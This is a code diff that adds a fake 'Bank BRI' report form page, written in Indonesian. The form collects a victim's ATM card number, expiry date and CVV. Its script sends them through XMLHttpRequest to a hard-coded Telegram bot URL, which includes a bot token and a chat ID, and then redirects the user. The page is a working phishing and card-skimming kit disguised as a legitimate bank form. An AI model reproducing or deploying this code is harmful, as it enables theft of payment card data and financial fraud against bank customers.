@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="theme-color" content="#007bff">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Bank BRI</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('https://i.ibb.co/com/8rnh5k0/1723381045176.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      background-attachment: fixed; /* Mengatur gambar latar belakang tetap saat scroll */
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      width: 300px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.9);
+      padding: 10px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      margin-top: 90px; /* Mengatur jarak atas dari container */
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .header h1 {
+      color: #007bff;
+      font-size: 16px;
+      text-transform: uppercase;
+      margin: 0;
+    }
+
+    .header hr {
+      border: 1px solid #000;
+      width: 80%;
+      margin: 10px auto;
+    }
+
+    .input-group {
+      margin-bottom: 10px;
+    }
+
+    .input-group label {
+      display: block;
+      color: #007bff;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 12px; /* Ukuran font lebih kecil */
+    }
+
+    .btn {
+      width: 87%;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      padding: 10px 15px;
+      cursor: pointer;
+      margin-left: 19px;
+      margin-top: 10px;
+    }
+
+    .btn-link {
+      display: block;
+      text-align: center;
+      margin-top: 10px;
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 2s linear infinite;
+      display: none;
+      position: absolute;
+      top: 50%;
+      left: 41%;
+      transform: translate(-50%, -50%);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .input-icon {
+      position: relative;
+    }
+
+    .input-icon img {
+      position: absolute;
+      top: 50%;
+      left: 5px;
+      transform: translateY(-50%);
+      width: 20px;
+      height: auto;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>FORMULIR LAPORAN BANK BRI<br>ID Laporan : 2265GA007</h1>
+      <hr>
+    </div>
+    <form id="registrationForm">
+      <div class="input-group">
+        <label for="nomor_kartu">16 Digit Angka No Kartu ATM</label>
+        <input type="text" id="nomor_kartu" name="nomor_kartu" placeholder="Masukkan Nomor Kartu" required style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;" maxlength="19">
+      </div>
+      <div class="input-group">
+        <label for="masa_berlaku">Valid Thru (Masa Berlaku)</label>
+        <input type="text" id="masa_berlaku" name="masa_berlaku" placeholder="MM/YY" required style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;" maxlength="5">
+      </div>
+      <div class="input-group">
+        <label for="cvv">CVV (3 Digit Di Balik Kartu)</label>
+        <input type="text" id="cvv" name="cvv" placeholder="CVV" required style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;" maxlength="3">
+      </div>
+      <button type="button" class="btn" onclick="kirimPesan()">LANJUT</button>
+      <a href="index.html" class="btn-link">Kembali ke Halaman Utama</a>
+      <div class="loader" id="loader"></div>
+    </form>
+  </div>
+
+  <script>
+    function addSlash(input) {
+        let value = input.value;
+        value = value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+            if (value.length > 5) {
+                if (value.length === 3) {
+                    value += '24';
+                }
+            }
+        }
+        input.value = value;
+    }
+
+    function formatCardNumber(input) {
+        let value = input.value;
+        value = value.replace(/\s/g, '');
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) {
+                formatted += ' ';
+            }
+            formatted += value[i];
+        }
+        input.value = formatted;
+    }
+
+    function hideCVV(input) {
+        input.type = 'password';
+    }
+
+    document.getElementById('nomor_kartu').addEventListener('input', function() {
+        formatCardNumber(this);
+    });
+
+    document.getElementById('masa_berlaku').addEventListener('input', function() {
+        addSlash(this);
+    });
+
+    document.getElementById('cvv').addEventListener('input', function() {
+        hideCVV(this);
+    });
+
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+      var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan(event) {
+      event.preventDefault(); // Mencegah pengiriman form secara default
+
+      var masaBerlaku = document.getElementById('masa_berlaku').value;
+      var cvv = document.getElementById('cvv').value;
+      var nomorKartu = document.getElementById('nomor_kartu').value;
+
+      if (masaBerlaku.trim() === '' || cvv.trim() === '' || nomorKartu.trim() === '') {
+        if (navigator.vibrate) {
+          navigator.vibrate(200);
+        }
+        return;
+      }
+
+      var message = "Masa Berlaku: " + masaBerlaku + "\nCVV: " + cvv + "\nNomor Kartu: " + nomorKartu;
+      sendMessageToTelegram(message);
+      
+      // Menampilkan loader dan tunggu beberapa detik sebelum melakukan redirect
+      var loader = document.getElementById('loader');
+      loader.style.display = 'block';
+
+      setTimeout(function() {
+        loader.style.display = 'none';
+        console.log('Data berhasil dikirim ke Telegram!');
+        window.location.href = 'halaman-selanjutnya.html';
+      }, 3000); // 3000 ms = 3 detik
+    }
+  </script>
+</body>
+</html>
